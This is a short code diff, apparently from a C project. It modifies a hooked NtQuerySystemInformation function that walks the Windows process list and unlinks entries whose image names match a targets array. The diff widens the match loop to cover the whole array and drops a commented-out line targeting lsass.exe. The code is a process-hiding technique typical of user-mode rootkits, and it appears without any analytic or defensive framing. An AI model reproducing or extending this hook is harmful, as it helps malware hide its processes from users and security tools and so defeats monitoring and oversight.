@@ -22,10 +22,9 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
             pCurrent = pNext;
             pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
 
-            for (int i = 0; i < 3; i++)
+            for (int i = 0; i < sizeof(targetNames) / sizeof(targetNames[i]); i++)
             {
                 if (!wcsncmp(pNext->ImageName.Buffer, targetNames[i], pNext->ImageName.Length))
-                // if (!wcsncmp(pNext->ImageName.Buffer, L"lsass.exe", pNext->ImageName.Length))
                 {
                     if (0 == pNext->NextEntryOffset)
                     {
